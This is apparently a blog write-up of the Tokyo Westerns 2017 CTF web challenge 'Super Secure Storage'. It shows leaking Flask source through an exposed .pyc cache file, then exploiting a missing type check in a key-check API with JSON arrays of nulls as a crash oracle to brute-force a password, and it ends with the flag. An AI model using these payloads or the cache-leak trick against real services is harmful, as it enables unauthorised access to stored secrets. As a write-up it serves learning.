---
layout: post
title: Super Secure Storage
category: Tokyo-Westerns-2017
---

# Description
As usual, Tokyo Westerns did a really good job with their challenges overall.
I've decided to post a writeup for this challenge in particular, as
the vulnerability was really interesting and isn't your typical python/template injection challenge.

# The Challenge

Super Secure Storage consisted of a website allowing users to store data encrypted
with a user-specified key.

Users can then fetch their encrypted message and supply a key in order to retrieve the
original message.

Here are the two webpages for this challenge :

![encrypt](/assets/img/tokyo-westerns-2017/encrypt.png)
![decrypt](/assets/img/tokyo-westerns-2017/decrypt.png)

---

The application offers a couple of API endpoints to go with these two pages.

## Encrypting Data

This endpoint is used to encrypt data with a given key.
The encrypted data and its corresponding ID is returned.

Request :
```
POST /api/data HTTP/1.1
Host: s3.chal.ctf.westerns.tokyo
Content-Length: 32
Content-Type: application/json;charset=UTF-8

{"data":"asdf","key":"12345678"}
```

Response :
```
{
  "data": "\u00da\u0080]\u00b2",
  "id": 81188,
  "result": true
}
```

## Retrieving Encrypted Messages
This endpoint allows us to fetch encrypted messages
for a given ID.

Request :
```
GET /api/data/8685 HTTP/1.1
Host: s3.chal.ctf.westerns.tokyo
```

Response :
```
{
  "data": "\u00da\u0080]\u00b2",
  "result": true
}
```

## Key Validation
This endpoint allows us to validate whether a given
key is valid for a given encrypted message.

Request :
```
POST /api/data/8685/check HTTP/1.1
Host: s3.chal.ctf.westerns.tokyo
Content-Length: 18
Content-Type: application/json;charset=UTF-8

{"key":"12345678"}
```

Response :
```
{
  "result": true
}
```

# Retrieving the Source Code

As for any web challenge, we start by viewing the /robots.txt for any interesting files.

```
$ curl http://s3.chal.ctf.westerns.tokyo/robots.txt
Disallow: /super_secret_secure_shared_directory_for_customer/
```

```
Index of /super_secret_secure_shared_directory_for_customer/

../
securestorage.conf                                 02-Sep-2017 03:38                 318
securestorage.ini                                  02-Sep-2017 03:38                 317

```

The website exposes a `securestorage.conf` and `securestorage.ini` file. The files contain the following :

```
$ cat securestorage.conf
server {
  listen 80;
  server_name s3.chal.ctf.westerns.tokyo;
  root /srv/securestorage;
  index index.html;

  location / {
    try_files $uri $uri/ @app;
  }

  location @app {
    include uwsgi_params;
    uwsgi_pass unix:///tmp/uwsgi.securestorage.sock;
  }

  location ~ (\.py|\.sqlite3)$ {
    deny all;
  }
}
```

```
$ cat securestorage.ini
[uwsgi]
chdir = /srv/securestorage
uid = www-data
gid = www-data
module = app
callable = app
socket = /tmp/uwsgi.securestorage.sock
chmod-socket = 666
vacuum = true
die-on-term = true
logto = /var/log/uwsgi/securestorage.log
processes = 8

env = SECRET_KEY=**CENSORED**
env = KEY=**CENSORED**
env = FLAG=**CENSORED**
```

The `.conf` file and `.ini` files seem to be a Nginx and uWSGI config file respectfully.

By reading the documentation on Nginx/uWSGI, there are a couple of things we can notice :

1. The Nginx config file blocks file access to `.py` and `.sqlite3` extensions. We can assume the backend is **Python** with a **SQlite** database.

2. uWSGI's `chdir` directive is also the root of the web server (**/srv/securestorage**).

3. uWSGI's `module` directive suggest that an `app.py` file exists.

The `chdir` option specifies in which folder to load the apps that will be used.
In combination with the `module` option, we can assume that the `app.py` file is
in the `/srv/securestorage` folder. This means that it should be accessible to us
since `/srv/securestorage` is also the root directory of the web server!

---

Technically, [http://s3.chal.ctf.westerns.tokyo/app.py](http://s3.chal.ctf.westerns.tokyo/app.py) should give us the source code.
But as we've mentionned earlier, the Nginx server blocks `.py` extensions. So we'll need another
way to leak the source code.

Since we're dealing with Python, a known trick is to leak the cache files as shown [here](https://ctftime.org/writeup/6714).
Cache files end with `.pyc`, which bypasses the restriction in the Nginx config.

We can download the compiled file here : [http://s3.chal.ctf.westerns.tokyo/\__pycache__/app.cpython-35.pyc](http://s3.chal.ctf.westerns.tokyo/__pycache__/app.cpython-35.pyc)

The cache file can then be decompiled using the [uncompyle6](https://github.com/rocky/python-uncompyle6) tool.

```
$ uncompyle6 app.cpython-35.pyc
# uncompyle6 version 2.11.5
# Python bytecode 3.5 (3350)
# Decompiled from: Python 3.5.0 (default, Aug 26 2017, 16:00:29)
# [GCC 4.2.1 Compatible Apple LLVM 8.1.0 (clang-802.0.42)]
# Embedded file name: ./app.py
# Compiled at: 2017-09-01 23:38:15
# Size of source mod 2**32: 3340 bytes
from flask import Flask, jsonify, request
from flask_sqlalchemy import SQLAlchemy
import hashlib
import os
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///./db.sqlite3'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True
app.secret_key = os.environ['SECRET_KEY']
db = SQLAlchemy(app)

class Data(db.Model):
    __tablename__ = 'data'
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String)
    data = db.Column(db.String)

    def __init__(self, key, data):
        self.key = key
        self.data = data

    def __repr__(self):
        return '<Data id:{}, key:{}, data:{}>'.format(self.id, self.key, self.data)

class RC4:

    def __init__(self, key=app.secret_key):
        self.stream = self.PRGA(self.KSA(key))

    def enc(self, c):
        return chr(ord(c) ^ next(self.stream))

    @staticmethod
    def KSA(key):
        keylen = len(key)
        S = list(range(256))
        j = 0
        for i in range(256):
            j = j + S[i] + ord(key[i % keylen]) & 255
            S[i], S[j] = S[j], S[i]

        return S

    @staticmethod
    def PRGA(S):
        i = 0
        j = 0
        while True:
            i = i + 1 & 255
            j = j + S[i] & 255
            S[i], S[j] = S[j], S[i]
            yield S[S[i] + S[j] & 255]

def verify(enc_pass, input_pass):
    if len(enc_pass) != len(input_pass):
        return False
    rc4 = RC4()
    for x, y in zip(enc_pass, input_pass):
        if x != rc4.enc(y):
            return False

    return True

@app.before_first_request
def init():
    db.create_all()
    if not Data.query.get(1):
        key = os.environ['KEY']
        data = os.environ['FLAG']
        rc4 = RC4()
        enckey = ''
        for c in key:
            enckey += rc4.enc(c)

        rc4 = RC4(key)
        encdata = ''
        for c in data:
            encdata += rc4.enc(c)

        flag = Data(enckey, encdata)
        db.session.add(flag)
        db.session.commit()

@app.route('/api/data', methods=['POST'])
def new():
    req = request.json
    if not req:
        return jsonify(result=False)
    for k in ['data', 'key']:
        if k not in req:
            return jsonify(result=False)

    key, data = req['key'], req['data']
    if len(key) < 8 or len(data) == 0:
        return jsonify(result=False)
    enckey = ''
    rc4 = RC4()
    for c in key:
        enckey += rc4.enc(c)

    encdata = ''
    rc4 = RC4(key)
    for c in data:
        encdata += rc4.enc(c)

    newdata = Data(enckey, encdata)
    db.session.add(newdata)
    db.session.commit()
    return jsonify(result=True, id=newdata.id, data=newdata.data)


@app.route('/api/data/<int:data_id>')
def data(data_id):
    data = Data.query.get(data_id)
    if not data:
        return jsonify(result=False)
    return jsonify(result=True, data=data.data)


@app.route('/api/data/<int:data_id>/check', methods=['POST'])
def check(data_id):
    data = Data.query.get(data_id)
    if not data:
        return jsonify(result=False)
    req = request.json
    if not req:
        return jsonify(result=False)
    for k in ['key']:
        if k not in req:
            return jsonify(result=False)

    enckey, key = data.key, req['key']
    if not verify(enckey, key):
        return jsonify(result=False)
    return jsonify(result=True)


if __name__ == '__main__':
    app.run()
# okay decompiling app.cpython-35.pyc
```
# This Isn't a Crypto Challenge

With the source code in hand, we get to see the internals of how the webserver works.

Firstly, we can understand that the encrypted flag is stored at ID #1 using
a password that we do not have access to.

```
    ...
    if not Data.query.get(1):
        key = os.environ['KEY']
        data = os.environ['FLAG']
        rc4 = RC4()
        enckey = ''
        for c in key:
            enckey += rc4.enc(c)

        rc4 = RC4(key)
        encdata = ''
        for c in data:
            encdata += rc4.enc(c)

        flag = Data(enckey, encdata)
        db.session.add(flag)
```
We can also see that we're dealing with an RC4 encryption algorithm.

We'll assume that the goal of the challenge is to find the key to decrypt
the encrypted message at ID #1.

---
Some have been tempted during the CTF to try to break the RC4 encryption.
Knowing that this challenge is flagged as "web", and believing that the Tokyo Western team knows
the difference between web and crypto, I highly doubted that this challenge required any kind of crypto knowledge.

With this in mind, we can narrow down the possibly vulnerable code quite a bit.

---

# The Vulnerability

The actual vulnerability lies in the `check()` and `verifiy()` functions used on the key validation API endpoint.

```
@app.route('/api/data/<int:data_id>/check', methods=['POST'])
def check(data_id):
    data = Data.query.get(data_id)
    if not data:
        return jsonify(result=False)
    req = request.json
    if not req:
        return jsonify(result=False)
    for k in ['key']:
        if k not in req:
            return jsonify(result=False)

    enckey, key = data.key, req['key']
    if not verify(enckey, key):
        return jsonify(result=False)
    return jsonify(result=True)

# ...

def verify(enc_pass, input_pass):
    if len(enc_pass) != len(input_pass):
        return False
    rc4 = RC4()
    for x, y in zip(enc_pass, input_pass):
        if x != rc4.enc(y):
            return False

    return True

# ...
def enc(self, c):
      return chr(ord(c) ^ next(self.stream))
```

The `check()` function takes a JSON object containing a `key` parameter. It does not check the type
of the `key` parameter.

**This means we can use `{"key" : "password"}` (a string) as well as `{"key" : ["a","b","c"]}` (a list)**.

For a given encrypted message, the `verify()` function then takes the associated encrypted password,
and compares it to the `key` we just gave it.

It does this by **first checking if the length of our key matches the length of the stored password**.
If it matches, it then takes each character of the user-supplied key, encrypts it, and compares it
to the corresponding character of the encrypted password. **The loop returns early if the character
is invalid**.

**The `enc()` function takes a single character and encrypts it through an `xor` operation.**

Using all the elements that I have highlighted in bold, we are able to guess the value of any key.

---

First off, because we can give a list object to the `verify()` function, we can make the application crash
in the `enc()` function by using `{"key" : [null, null, null]}` (`ord(None)` will crash).

With this, we can obtain the length of the password for our encrypted flag.
If the length of `key` does not match the actual length of the password, the `verifiy()` function
will return early. If it does match, the function will attempt to `enc(None)` which will crash.

```
{"key":[null]} # Responds with {"result": false}
{"key":[null,null]} # Responds with {"result": false}
{"key":[null,null,null]} # Responds with {"result": false}
{"key":[null,null,null,null]} # Responds with {"result": false}
...
{"key":[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]} # Crashes
```

So the length of the password is 16.

Using the same type of attack, we can now guess each character of the password.
As mentionned above, the `verify()` loop will only check the next character
if the previous one is valid.

Which means that for a message with the password "abcd", the key
```
{"key":["Z", null, null, null]}
```
will not crash and return `False`, since `"Z" != "a"`.

Conversly, the payload
```
{"key":["a", null, null, null]}
```
will crash, since the first character matches the original password,
triggering the `enc(None)` bug for the next character.

We can now bruteforce each character of the password by checking if the application
crashed or not.
```
Returned false : p
Returned false : q
Returned false : r
Returned false : s
Crashed : t
Returned false : 0
Returned false : 1
Crashed : 2
Returned false : 0
Returned false : 1
Returned false : 2
```

After bruteforcing the password, we decrypt the encrypted message at ID #1 to obtain the flag.

![flag](/assets/img/tokyo-westerns-2017/flag.png)

```
Key : t2gavAjbPtj9gyps
Flag : TWCTF{yet-an0ther-pyth0n-0rac1e}
```

